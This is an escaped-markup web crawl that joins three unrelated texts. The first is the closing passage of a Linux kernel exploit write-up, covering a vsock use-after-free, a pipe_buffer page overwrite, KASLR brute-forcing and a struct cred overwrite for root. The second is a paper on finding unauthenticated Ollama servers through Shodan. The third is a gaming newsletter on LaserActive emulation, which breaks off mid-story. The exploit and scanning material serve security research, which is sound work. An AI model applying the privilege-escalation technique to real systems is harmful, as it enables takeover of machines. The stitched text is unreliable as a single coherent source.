#define PAGE_ADDR_OFFSET(addr) (((addr &amp;amp; 0x3ffffffflu) &amp;gt;&amp;gt; 12) * STRUCT_PAGE_SZ)
uaf_val = PAGE_ADDR_OFFSET(cred_addr);
&lt;/code&gt;
    &lt;p&gt;The idea behind it is simple:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;addr &amp;amp; 0x3ffffffflu&lt;/code&gt;gives the offset of the&lt;code&gt;struct cred&lt;/code&gt;from the&lt;code&gt;page_offset_base&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Right shift by 12 gives the number of the memory page containing &lt;code&gt;struct cred&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Finally, multiplication by 64 (the size of &lt;code&gt;struct page&lt;/code&gt;) gives the offset of the corresponding&lt;code&gt;struct page&lt;/code&gt;in the&lt;code&gt;vmemmap&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This formula should be adapted if the system has more than 4 GiB of RAM. In that case, &lt;code&gt;ZONE_NORMAL&lt;/code&gt; containing kernel allocations usually starts at address &lt;code&gt;0x100000000&lt;/code&gt;. Hence, to calculate the offset of the needed &lt;code&gt;struct page&lt;/code&gt;, we should add &lt;code&gt;(0x100000000 &amp;gt;&amp;gt; 12) * STRUCT_PAGE_SZ&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Excellent, the described formula is independent of KASLR for physical addresses, so I could use it to calculate the four lower bytes of the target address for exploiting the pipe AARW against the &lt;code&gt;struct cred&lt;/code&gt;. Why I needed only four lower bytes of &lt;code&gt;pipe_buffer.page&lt;/code&gt;:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;My UAF write to &lt;code&gt;peer_buf_alloc&lt;/code&gt;performed partial overwriting of the first half of the&lt;code&gt;pipe_buffer.page&lt;/code&gt;pointer, as I showed at the diagram above.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;x86_64&lt;/code&gt;is little-endian, so the first half of the pointer contains four lower bytes of the address.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;But when I tried this approach, KASLR carried out its last revenge. It randomized the &lt;code&gt;vmemmap_base&lt;/code&gt; address, and the four lower bytes of the &lt;code&gt;struct page&lt;/code&gt; pointers carried two random bits. Ouch!&lt;/p&gt;
    &lt;p&gt;However, I decided to brute-force those two bits because I could achieve the UAF write around 5 times before the kworker got a null-ptr-deref after &lt;code&gt;VSOCK_CLOSE_TIMEOUT&lt;/code&gt; (8 sec).&lt;/p&gt;
    &lt;p&gt;I found that probing different values of &lt;code&gt;pipe_buffer.page&lt;/code&gt; from userspace works perfectly well:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;In case of fail, reading from the pipe simply returns &lt;code&gt;Bad address&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;In case of success, reading from the pipe gives &lt;code&gt;struct cred&lt;/code&gt;contents.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Great! I could finally determine a proper AARW target address, write to the pipe, overwrite euid and egid with 0, and get root. See the PoC exploit demo:&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;Bug collisions are painful. Finishing the research anyway is rewarding. Let me quote my good friend:&lt;/p&gt;
    &lt;p&gt;Working on this hard race condition with multiple limitations allowed me to discover new exploitation techniques and to use and improve my pet project kernel-hack-drill, which provides a testing environment for Linux kernel security researchers. You are welcome to try it and contribute.&lt;/p&gt;

    &lt;p&gt;The rapid deployment of large language models (LLMs) has introduced significant security vulnerabilities due to misconfigurations and inadequate access controls. This paper presents a systematic approach to identifying publicly exposed LLM servers, focusing on instances running the Ollama framework. Utilizing Shodan, a search engine for internet-connected devices, we developed a Python-based tool to detect unsecured LLM endpoints. Our study uncovered over 1,100 exposed Ollama servers, with approximately 20% actively hosting models susceptible to unauthorized access. These findings highlight the urgent need for security baselines in LLM deployments and provide a practical foundation for future research into LLM threat surface monitoring.&lt;/p&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;The integration of large language models (LLMs) into diverse applications has surged in recent years, driven by their advanced capabilities in natural language understanding and generation. Widely adopted platforms such as ChatGPT, Grok, and DeepSeek have contributed to the mainstream visibility of LLMs, while open-source frameworks like Ollama and Hugging Face have significantly lowered the barrier to entry for deploying these models in custom environments. This has led to widespread adoption by both organizations and individuals of a broad range of tasks, including content generation, customer support, data analysis, and software development.&lt;/p&gt;
    &lt;p&gt;Despite their growing utility, the pace of LLM adoption has often outstripped the development and implementation of appropriate security practices. Many self-hosted or locally deployed LLM solutions are brought online without adequate hardening, frequently exposing endpoints due to default configurations, weak or absent authentication, and insufficient network isolation. These vulnerabilities are not only a byproduct of poor deployment hygiene but are also symptomatic of an ecosystem that has largely prioritized accessibility and performance over security. As a result, improperly secured LLM instances present an expanding attack surface, opening the door to risks such as:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Unauthorized API Access — Many ML servers operate without authentication, allowing anyone to submit queries.&lt;/item&gt;
      &lt;item&gt;Model Extraction Attacks — Attackers can reconstruct model parameters by querying an exposed ML server repeatedly.&lt;/item&gt;
      &lt;item&gt;Jailbreaking and Content Abuse — LLMs like GPT-4, LLaMA, and Mistral can by manipulated to generate restricted content, including misinformation, malware code, or harmful outputs.&lt;/item&gt;
      &lt;item&gt;Resource Hijacking (ML DoS Attacks) — Open AI models can be exploited for free computation, leading to excessive costs for the host.&lt;/item&gt;
      &lt;item&gt;Backdoor Injection and Model Poisoning — Adversaries could exploit unsecured model endpoints to introduce malicious payloads or load untrusted models remotely.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This work investigates the prevalence and security posture of publicly accessible LLM servers, with a focus on instances utilizing the Ollama framework, which has gained popularity for its ease of use and local deployment capabilities. While Ollama enables flexible experimentation and local model execution, its deployment defaults and documentation do not explicitly emphasize security best practices, making it a compelling target for analysis.&lt;/p&gt;
    &lt;p&gt;To assess the real-world implications of these concerns, we leverage the Shodan search engine to identify exposed Ollama servers and evaluate their security configurations. Our investigation is guided by three primary contributions:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Development of a proof-of-concept tool, written in Python, to detect exposed Ollama servers through Shodan queries&lt;/item&gt;
      &lt;item&gt;Analysis of identified instances evaluate authentication enforcement, endpoint exposure, and model accessibility&lt;/item&gt;
      &lt;item&gt;Recommendations for mitigating common vulnerabilities in LLM deployments, with a focus on practical security improvements&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Our findings reveal that a significant number of organizations and individuals expose their LLM infrastructure to the internet, often without realizing the implications. This creates avenues for misuse, ranging from resource exploitation to malicious prompt injection and data inference.&lt;/p&gt;
    &lt;head rend="h2"&gt;Methodology&lt;/head&gt;
    &lt;p&gt;The proposed system utilizes Shodan, a search engine that indexes internet-connected devices, to identify potentially vulnerable AI inference servers. This approach was selected with privacy and ethical considerations in mind, specifically to avoid the risks associated with directly scanning remote systems that may already be exposed or improperly secured. By relying on Shodan’s existing database of indexed endpoints, the system circumvents the need for active probing, thereby reducing the likelihood of triggering intrusion detection systems or violating acceptable use policies.&lt;/p&gt;
    &lt;p&gt;In addition to being more ethical, leveraging Shodan also provides a scalable and efficient mechanism for identifying LLM deployments accessible over the public internet. Manual enumeration or brute-force scanning of IP address ranges would be significantly more resource-intensive and potentially problematic from both legal and operational perspectives.&lt;/p&gt;
    &lt;p&gt;The system operates in two sequential stages. In the first stage, Shodan is queried to identify publicly accessible Ollama servers based on distinctive network signatures or banners. In the second stage, each identified endpoint is programmatically queried to assess its security posture, with a particular focus on authentication and authorization mechanisms. This includes evaluating whether endpoints require credentials, enforce access control, or expose model metadata and functionality without restriction.&lt;/p&gt;
    &lt;p&gt;An overview of the system architecture is illustrated in Figure 1, which outlines the workflow from endpoint discovery to vulnerability analysis.&lt;/p&gt;
    &lt;head rend="h2"&gt;Detecting Exposed Ollama Servers&lt;/head&gt;
    &lt;p&gt;Our approach focuses on identifying deployments of popular LLM hosting tools by scanning for default ports and service banners associated with each implementation. Below we provide a list of LLM platforms examined and their associated default ports, which are used as heuristics for identification:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Ollama / Mistral / LLaMA models — Port 11434&lt;/item&gt;
      &lt;item&gt;vLLM — Port 8000&lt;/item&gt;
      &lt;item&gt;llama.cpp — Ports 8000, 8080&lt;/item&gt;
      &lt;item&gt;LM Studio — Port 1234&lt;/item&gt;
      &lt;item&gt;GPT4All — Port 4891&lt;/item&gt;
      &lt;item&gt;LangChain — Port 8000&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Using the Shodan API, the system retrieves metadata for hosts operating on these ports, including IP addresses, open ports, HTTP headers, and service banners. To minimize false positives, such as unrelated applications using the same ports, the developed system performs an additional filtering step based on banner content. For example, Ollama instances are verified using keyword matching against the service banner (e.g., port:11434 “Ollama”), which increases confidence that the endpoint is associated with the targeted LLM tooling rather than an unrelated application using the same port.&lt;/p&gt;
    &lt;p&gt;During analysis, we identified an additional signature that enhanced the accuracy of fingerprinting Ollama deployments. Specifically, a significant proportion of the discovered Ollama instances were found to be running the Uvicorn ASGI server, a lightweight, Python-based web server commonly employed for serving asynchronous APIs. In such cases, the HTTP response headers included the field Server: “uvicorn”, which functioned as a valuable secondary indicator, particularly when the service banner lacked an explicit reference to the Ollama platform. Conversely, our research also indicates that servers running Uvicorn are more likely to host LLM applications as this Python-based web server appears to be popular among software used for self-hosting LLMs.&lt;/p&gt;
    &lt;p&gt;This observation strengthens the resilience of our detection methodology by enabling the inference of Ollama deployments even in the absence of direct product identifiers. Given Uvicorn’s widespread use in Python-based microservice architectures and AI inference backends, its presence, especially when correlated with known Ollama-specific ports (e.g., 11434) substantially increases the confidence level that a host is serving an LLM-related application. A layered fingerprinting approach improves the precision of our system and reduces reliance on single-point identifiers that may be obfuscated or omitted.&lt;/p&gt;
    &lt;p&gt;The banner-based fingerprinting method draws from established principles in network reconnaissance and is a widely accepted approach in both academic research and penetration testing contexts. According to prior work in internet-wide scanning, service banners and default ports provide a reliable mechanism for characterizing software deployments at scale, albeit with limitations in environments employing obfuscation or non-standard configurations.&lt;/p&gt;
    &lt;p&gt;By combining port-based filtering with banner analysis and keyword validation, our system aims to strike a balance between recall and precision in identifying genuinely exposed LLM servers, thus enabling accurate and responsible vulnerability assessment.&lt;/p&gt;
    &lt;head rend="h2"&gt;Authorization and Authentication Assessment&lt;/head&gt;
    &lt;p&gt;Once a potentially vulnerable Ollama server is identified, we initiate a series of automated API queries to determine whether access controls are in place and whether the server responds deterministically to standardized test inputs. This evaluation specifically assesses the presence or absence of authentication enforcement and the model’s responsiveness to benign prompt injections, thereby providing insight into the system’s exposure to unauthorized use. To minimize operational risk and ensure ethical testing standards, we employ a minimal, non-invasive prompt structure as follows:&lt;/p&gt;
    &lt;p&gt;A successful HTTP 200 response accompanied by the correct result (e.g., “4”) indicates that the server is accepting and executing prompts without requiring authentication. This represents a high-severity security issue, as it suggests that arbitrary, unauthenticated prompt execution is possible. In such cases, the system is exposed to a broad range of attack vectors, including the deployment and execution of unauthorized models, prompt injection attacks, and the deletion or modification of existing assets.&lt;/p&gt;
    &lt;p&gt;Moreover, unprotected endpoints may be subjected to automated fuzzing or adversarial testing using tools such as Promptfoo or Garak, which are designed to probe LLMs for unexpected behavior or latent vulnerabilities. These tools, when directed at unsecured instances, can systematically uncover unsafe model responses, prompt leakage, or unintended completions that may compromise the integrity or confidentiality of the system.&lt;/p&gt;
    &lt;p&gt;Conversely, HTTP status codes 401 (Unauthorized) or 403 (Forbidden) denote that access controls are at least partially enforced, often through default authentication mechanisms. While such configurations do not guarantee full protection, particularly against brute-force or misconfiguration exploits, they substantially reduce the immediate risk of casual or opportunistic exploitation. Nonetheless, even authenticated instances require scrutiny to ensure proper isolation, rate limiting, and audit logging, as part of a comprehensive security posture.&lt;/p&gt;
    &lt;head rend="h2"&gt;Findings&lt;/head&gt;
    &lt;p&gt;The results from our scans confirmed the initial hypothesis: a significant number of Ollama servers are publicly exposed and vulnerable to unauthorized prompt injection. Utilizing an automated scanning tool in conjunction with Shodan, we identified 1,139 vulnerable Ollama instances. Notably, the discovery rate was highest in the initial phase of scanning, with over 1,000 instances detected within the first 10 minutes, highlighting the widespread and largely unmitigated nature of this exposure.&lt;/p&gt;
    &lt;p&gt;Geospatial analysis of the identified servers revealed a concentration of vulnerabilities in several major regions. As depicted in Figure 3, the majority of exposed servers were hosted in the United States (36.6%), followed by China (22.5%) and Germany (8.9%). To protect the integrity and privacy of affected entities, IP addresses have been redacted in all visual documentation of the findings.&lt;/p&gt;
    &lt;p&gt;Out of the 1,139 exposed servers, 214 were found to be actively hosting and responding to requests with live models—accounting for approximately 18.8% of the total scanned population with Mistral and LLaMA representing the most frequently encountered deployments. A review of the least common model names was also conducted, revealing what appeared to be primarily self-trained or otherwise customized LLMs. In some instances, the names alone provided enough information to identify the hosting party. To safeguard their privacy, tha names of these models have been excluded from the findings. These interactions confirm the feasibility of prompt-based interaction without authentication, and thus the risk of exploitation.&lt;/p&gt;
    &lt;p&gt;Conversely, the remaining 80% of detected servers, while reachable via unauthenticated interfaces, did not have any models instantiated. These “dormant” servers, though not actively serving model responses, remain susceptible to exploitation via unauthorized model uploads or configuration manipulation. Importantly, their exposed interfaces could still be leveraged in attacks involving resource exhaustion, denial of service, or lateral movement.&lt;/p&gt;
    &lt;p&gt;An additional observation was the widespread adoption of OpenAI-compatible API schemas across disparate model hosting platforms. Among the discovered endpoints, 88.89% adhered to the standardized route structure used by OpenAI (e.g., v1/chat/completions), enabling simplified interoperability but also creating uniformity that could be exploited by automated attack frameworks. This API-level homogeneity facilitates the rapid development and deployment of malicious tooling capable of interacting with multiple LLM providers with minimal modification.&lt;/p&gt;
    &lt;p&gt;These findings showcase a critical and systemic vulnerability in the deployment of LLM infrastructure. The ease with which these servers can be located, fingerprinted, and interacted with raises urgent concerns regarding operational security, access control defaults, and the potential for widespread misuse in the absence of robust authentication and model access restrictions.&lt;/p&gt;
    &lt;head rend="h2"&gt;Limitations&lt;/head&gt;
    &lt;p&gt;While the proposed system effectively identified a substantial number of exposed Ollama servers, several limitations should be acknowledged that may impact the completeness and accuracy of the results.&lt;/p&gt;
    &lt;p&gt;First, the detection process is inherently limited by Shodan’s scanning coverage and indexing frequency. Only servers already discovered and cataloged by Shodan can be analyzed, meaning any hosts outside its visibility, due to firewalls, opt-out policies, or geographical constraints remain undetected.&lt;/p&gt;
    &lt;p&gt;Secondly, the system relies on Shodan’s fingerprinting accuracy. If Ollama instances are configured with custom headers, reverse proxies, or stripped HTTP metadata, they may not be correctly classified by Shodan, leading to potential false negatives.&lt;/p&gt;
    &lt;p&gt;Third, the approach targets default and commonly used ports (e.g., 11434), which introduces a bias toward standard configurations. Servers running on non-standard or intentionally obfuscated ports are likely to evade detection entirely.&lt;/p&gt;
    &lt;p&gt;Finally, the analysis focuses exclusively on Ollama deployments and does not extend to other LLM hosting frameworks. While this specialization enhances precision within a narrow scope, it limits generalizability across the broader LLM infrastructure landscape.&lt;/p&gt;
    &lt;head rend="h2"&gt;Mitigation Strategies&lt;/head&gt;
    &lt;p&gt;The widespread exposure of unauthenticated Ollama servers highlights the urgent need for standardized, practical, and layered mitigation strategies aimed at securing LLM infrastructure. Below, we propose a set of technical and procedural defenses, grounded in best practices and supported by existing tools and frameworks.&lt;/p&gt;
    &lt;head rend="h3"&gt;Enforce Authentication and Access Control&lt;/head&gt;
    &lt;p&gt;The most critical step in mitigating unauthorized access is the implementation of robust authentication mechanisms. Ollama instances, and LLM servers in general, should never be publicly exposed without requiring secure API key-based or token-based authentication. Preferably, authentication should be tied to role-based access control (RBAC) systems to limit the scope of what users can do once authenticated.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Enforce API key or OAuth2-based authentication&lt;/item&gt;
      &lt;item&gt;Tools/References: OAuth 2.0 Framework OWASP API Security Top 10&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Network Segmentation and Firewalling&lt;/head&gt;
    &lt;p&gt;Publicly exposing inference endpoints over the internet, particularly on default ports, dramatically increases the likelihood of being indexed by services like Shodan. LLM endpoints should be deployed behind network-level access controls, such as firewalls, VPCs, or reverse proxies, and restricted to trusted IP ranges or VPNs.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Use security groups, firewalls, and private subnets to isolate LLM services&lt;/item&gt;
      &lt;item&gt;Tools/References: AWS Security Best Practices, Zero Trust Architecture&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Rate Limiting and Abuse Detection&lt;/head&gt;
    &lt;p&gt;To prevent automated abuse and model probing, inference endpoints should implement rate limiting, throttling, and logging mechanisms. This can hinder brute-force attacks, prompt injection attempts, or resource hijacking.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Integrate API gateways (e.g., Kong, Amazon API Gateway) to enforce limits and monitor anomalous behavior&lt;/item&gt;
      &lt;item&gt;Tools/References: OWASP Rate Limiting Guide, Grafana for Monitoring&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Disable Default Ports and Obfuscate Service Banners&lt;/head&gt;
    &lt;p&gt;Default ports (e.g., 11434 for Ollama) make fingerprinting trivial. To complicate scanning efforts, operators should consider changing default ports and disabling verbose service banners in HTTP responses or headers (e.g., removing “uvicorn” or “Ollama” identifiers).&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Modify default configurations to suppress identifiable metadata&lt;/item&gt;
      &lt;item&gt;Tools/References: Nginx reverse proxy configuration, systemd hardening&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Secure Model Upload and Execution Pipelines&lt;/head&gt;
    &lt;p&gt;Ollama and similar tools support dynamic model uploads, which, if unsecured, present a vector for model poisoning or backdoor injection. Model upload functionality should be restricted, authenticated, and ideally audited. All models should be validated against a hash or verified origin before execution.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Use content whitelisting, digital signatures, or harsh verification for uploaded models&lt;/item&gt;
      &lt;item&gt;Tools/References: Model Card Toolkit, Secure Supply Chain principles from SLSA&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Continuous Monitoring and Automated Exposure Audits&lt;/head&gt;
    &lt;p&gt;Operators should implement continuous monitoring tools that alert when LLM endpoints become publicly accessible, misconfigured, or lack authentication. Scheduled Shodan queries or custom scanners can help detect regressions in deployment security.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Recommendation: Use automated tools like Project Discovery’s naabu, or write custom Shodan monitoring scripts&lt;/item&gt;
      &lt;item&gt;Tools/References: Project Discovery Tools, Shodan Alert API&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;This study reveals a concerning landscape of insecure large language model deployments, with a particular focus on Ollama-based servers exposed to the public internet. Through the use of Shodan and a purpose-built detection tool, we identified over 1,100 unauthenticated LLM servers, a substantial proportion of which were actively hosting vulnerable models. These findings highlight a widespread neglect of fundamental security practices such as access control, authentication, and network isolation in the deployment of AI systems.&lt;/p&gt;
    &lt;p&gt;The uniform adoption of OpenAI-compatible APIs further exacerbates the issue, enabling attackers to scale exploit attempts across platforms with minimal adaptation. While only a subset of the exposed servers were found to be actively serving models, the broader risk posed by dormant yet accessible endpoints cannot be understated. Such infrastructure remains vulnerable to abuse through unauthorized model execution, prompt injection, and resource hijacking. Our work underscores the urgent need for standardized security baselines, automated auditing tools, and improved deployment guidance for LLM infrastructure.&lt;/p&gt;
    &lt;p&gt;Looking ahead, future work should explore the integration of multiple data sources, including Censys, ZoomEye, and custom Nmap-based scanners to improve discovery accuracy and reduce dependency on a single platform. Additionally, incorporating adaptive fingerprinting and active probing techniques could enhance detection capabilities in cases where servers use obfuscation or non-standard configurations. Expanding the system to identify deployments across a wider range of LLM hosting frameworks, such as Hugging Face, Triton, and vLLM, would further increase coverage and relevance. Finally, non-standard port detection and adversarial prompt analysis offer promising avenues for refining the system’s ability to detect and characterize hidden or evasive LLM deployments in real-world environments.&lt;/p&gt;

  &lt;main&gt;
    &lt;head rend="h1"&gt;"This is the first:" The 16 year odyssey of "time, money, wrong turns and frustration" it took to finally emulate the Pioneer LaserActive&lt;/head&gt;
    &lt;p&gt;In April 2009, a Sega fan decided to look into emulating the Mega LD, a quirky and little-known hybrid of Genesis and LaserDisc. This week he finished the job.&lt;/p&gt;
    &lt;p&gt;Hey there ROM readers! I've got an absolute whopper of a story this issue with a genuine longform dive into the emulation of the LaserActive, plus a bit of backstory on the new fan translation of the Cowboy Bebop game for PS2, plus your usual quick hits on emulator improvements, FPGA happenings and other fan translation progress. That means there's absolutely no more time or space to waste on this intro.&lt;/p&gt;
    &lt;p&gt;LET'S GET TO IT.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Big Two&lt;/head&gt;
    &lt;head rend="h3"&gt;1. The LaserActive "might be the last vintage home console of note which hadn't been emulated," but no longer&lt;/head&gt;
    &lt;p&gt;The story behind the birth of any new emulator has some common ingredients. Fearsome programming skills; hundreds or thousands of hours of thankless work; the drive to understand exactly how and why a piece of technology works. None of these things come without patience. But lifelong Sega fan Nemesis, who released the first-ever emulator for the Pioneer LaserActive this week — 16 years after first pondering the idea — had no choice but to be patient. Because for most of the last decade, emulating the LaserActive was simply impossible.&lt;/p&gt;
    &lt;p&gt;"All along the way, the video made things difficult," he says. "The hardware to capture the signal properly didn’t exist. The software to decode the captured signal properly didn’t exist. And finally, a format to store the decoded video in a form suitable for emulation, also didn’t exist."&lt;/p&gt;
    &lt;p&gt;There's no other game console quite like the Pioneer LaserActive, which was released in 1993, sold abysmally and was dead in the ground by 1996. That's not a unique story for a '90s game system, but the LaserActive kinda... wasn't one. It was a LaserDisc player with an expansion bay that owners could slot different modules into. One transformed the LaserActive into a karaoke machine. Another would give it the guts of a PC Engine. And a third added the brains of a Sega Genesis/Mega Drive, able to play Sega CD games as well as about two dozen made for the short-lived Mega LD.&lt;/p&gt;
    &lt;p&gt;The Mega LD format represented a technological leap over early LaserDisc-based arcade games like Dragon's Lair. The mid-'90s promise of FULL MOTION VIDEO GAMEPLAY may be quaint as hell today, but it's the reason the LaserActive has been impossible to emulate for 30 years. And it still would be today, if Nemesis hadn't spent much of the 21st century proactively collecting Sega hardware and Mega LD games with the goal of one day preserving them.&lt;/p&gt;
    &lt;p&gt;Nemesis's history with both games and emulation started with the Genesis (which I will refer to as the Mega Drive for the rest of this issue, out of respect for his native Australia). After owning a Mega Drive, 32X and Mega CD growing up, he played his first emulator, the Nesticle successor Genecyst, on a Pentium 133 circa 1997. That eventually led to contributing to reverse-engineering and emulation efforts.&lt;/p&gt;
    &lt;p&gt;"I did a lot of work on the YM2612 FM chip in the Mega Drive back in 2008 in particular, and a lot of Mega Drive emulators finally had decent FM sound after that as a result," he says. "Sharing that research, seeing the results made use of, and finally hearing the games I remembered from my childhood sound right for the first time, was a really good feeling."&lt;/p&gt;
    &lt;p&gt;In 2004, when buying loads of retro consoles was not yet a universal pasttime for nostalgic millenials and Gen Xers, he paid about $200 for one of the approximately 10,000 LaserActives that Pioneer manufactured in its short life, along with the Mega LD "PAC" module. Throughout the rest of the decade he scooped up every bit of Sega hardware he could get his hands on with an eye towards future reverse-engineering projects, but it wasn't until 2009 when he started thinking: Why isn't there an emulator for the LaserActive?&lt;/p&gt;
    &lt;p&gt;So he did what any retro game fan would do in 2009: started a forum thread about it.&lt;/p&gt;
    &lt;p&gt;"This system keeps popping into my mind," he wrote in the thread, which is still online today. "I don't think anyone's had a serious crack at emulating it yet, and I really don't think it would be very hard to do."&lt;/p&gt;
    &lt;p&gt;Well. About that.&lt;/p&gt;
    &lt;p&gt;"I honestly feel like I've nearly 'solved' this system half a dozen times over by now," Nemesis says here in 2025.&lt;/p&gt;
    &lt;p&gt;"The digital side of the system was actually pretty straightforward. When you break it down, the LaserActive is really more like a big oversized add-on to the console hardware. What that add-on provides is a different drive control interface, another audio source, and another video source, with mixing features to combine that video/audio with the console video/audio. That's really about it. On paper, it's pretty simple. In reality though, the LaserActive hardware did present a lot of challenges, mostly due to its inherent unreliability."&lt;/p&gt;
    &lt;p&gt;With prior experience writing a Genesis emulator of his own, Nemesis originally thought he'd be well-positioned to tackle the LaserActive. But the problem started to pile up immediately. First there were the almost 100 capacitors in the Sega PAC that were guaranteed to fail at some point, causing many to have to be replaced on even a mint condition system. Pioneer's cost-cutting inside the LaserDisc player caused other parts to break, too. Learning to fix the LaserActive was a necessary step to figuring out how it worked.&lt;/p&gt;
    &lt;p&gt;2011 was a year of progress. Nemesis:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Coded a program to load onto a Mega Drive flash cart that allowed him to "probe" the LaserActive hardware&lt;/item&gt;
      &lt;item&gt;Disassembled the system BIOS to identify that "ll the interaction with the LaserActive hardware happened over a custom register block"&lt;/item&gt;
      &lt;item&gt;Coded another program that allowed direct read/write access to those registers using a controller&lt;/item&gt;
      &lt;item&gt;With the help of other forumites, mapped most of the registers by comparing the system's actions to the code in the disassembldd BIOS and documented what it was doing&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The next two years were focused on figuring out how to rip the LaserActive's games. This involved writing multiple more custom programs and using a special USB-to-MD link cable to copy the digital data from the disc, which contained the game code as well as audio tracks. When that didn't prove to be enough to capture the TOC (or table of contents) data that essentially acted as a guide to how all the data on the disc was organized, he had to go deeper.&lt;/p&gt;
    &lt;p&gt;"I soldered a bunch of physical tapping wires into my Sega PAC-S10 module, and used a Saleae logic analyzer clone to do a streaming capture of the data lines when the TOC region was being read, which the hardware didn't make directly available. I wrote a program to parse the bus trace and extract the data from the raw capture and reconstruct the lead-in. At this point, I had everything I needed to rip a full bin/cue image of the digital data from a LaserDisc."&lt;/p&gt;
    &lt;p&gt;In 2014, Nemesis started soliciting other members of the forum where he chronicled the project to send him Mega LD games to dump (shout out to doc eggfan, who acquired most of the library including two Myst prototypes; "if he hadn't done that, there's a good chance they would have been lost forever). With a pile of games in hand, he bought a PC video capture card to rip the audio and video from the discs. And this is where the 2-3 people reading this who have an intimate understanding of the LaserActive will probably reflexively say "uh oh."&lt;/p&gt;
    &lt;p&gt;LaserDisc, despite looking like a jumbo DVD, is an analog video medium. No big deal if you're just capturing a movie. But for a game? Big big deal. Here's the long-form breakdown — skip ahead if you don't want to get way deep into analog-to-digital misery.&lt;/p&gt;
    &lt;quote&gt;"No analog capture cards of the day were actually up to the task of what we were trying to do. ... The LaserActive has one of the fastest, most powerful control systems for LaserDisc playback ever made, and the game has direct, immediate control over it. Rarely is the player just playing back a video normally. Games will often have completely different video footage per field, with only one shown, or skip over every second frame, to mix four or more video streams in the same area of the disc. Many games use this for seamless 'branching' such as whether you go left or right, and this can change constantly and seamlessly during playback. The unit can play faster or slower, even playing in reverse, such as in Rocket Coaster as you speed up, or slide backwards down a slope. The unit can perform rapid nearly instant seeks with seamless looping, and does for games like Myst. In fact, the entire Myst title is basically using the LaserDisc as a set of random, short transitions, and still images, and other titles do this as well to differing degrees. ...&lt;lb/&gt;Games used the skip play features to further interleave different video streams at half the framerate between each other. Analog capture cards of the day didn't deal with this well. None of them could compress lossless video, everything was encoded to lossy formats. Most of them would assume a 480i image. This would cause the separate video streams in each field to 'bleed into' each other, destroying the image. The same problem occurred between frames when they had separate video streams interleaved together, where inter-frame compression would cause artifacts from the two streams to bleed together.&lt;lb/&gt;A high end Canopus capture card I had was the only one that was capable of compressing into huffyuv, not in a lossless form, but at least in a format that prevented this bleeding problem. Unfortunately, this card still had a limitation, in that it couldn't capture the VBI data. It was common in the day for special 'control codes' to be encoded into lines normally hidden on a normal TV, which contained information. In the case of LaserDiscs, it contained frame numbers, timecodes, picture stop codes, video TOC information in the lead-in, and other such data. None of that could be captured by capture cards of the day. For cards that had VBI capture features, they didn't work on LaserDiscs, since LaserDiscs used different lines/formats than other sources, and no capture cards in the world expected to be capturing LaserDisc video.&lt;lb/&gt;At this point, I felt like I'd hit a bit of a dead end. It could, perhaps, have been possible to cobble something together at this point in 2014, but I felt the result would be poor, and the discs would not have been properly preserved. I decided a different approach was needed for the analog video content, but the technology to do what I needed to do at this point, didn't seem to exist."&lt;/quote&gt;
    &lt;p&gt;With an increasingly busy home life thanks to two young kids, a long commute and demanding workload at the office, Nemesis did the only thing that made sense at that point. He put the LaserActive on the shelf.&lt;/p&gt;
    &lt;p&gt;Two years later, he took another stab at it by trying to build his own hardware capture setup. By tapping into the LaserActive directly, he was able to capture a full, raw composite video signal — but it was useless unless he could decode it. Back on the shelf it went for another two years.&lt;/p&gt;
    &lt;p&gt;A house move, shorter commute and more balanced work-life, er, balance, later, Nemesis decided to dust off the LaserActive. Enter the Domesday Duplicator — an open source, community-driven hardware project dedicated to ripping LaserDiscs.&lt;/p&gt;
    &lt;p&gt;Surely this was the capture solution he'd been waiting for. Turns out it was... but not in 2018. A key companion to the Domesday Duplicator, ld-decode, was then still "in its infancy." At the time there was no publicly available software solution to decoding composite video; by the time computers were fast enough to do it without dedicated hardware, analog was donezo. Nemesis went down the path of trying to write his own decoder to mixed results, but when he found out kid #4 was on the way, he decided to wait for the broader community effort to mature.&lt;/p&gt;
    &lt;p&gt;And it did mature by a lot, with both the Duplicator and ld-decode improving process of ripping LaserDiscs in the higest possible quality. But there was still a problem when it came to LaserActive discs — they were interactive games, not static films. In 2020 Nemesis started chipping in to ld-decode:&lt;/p&gt;
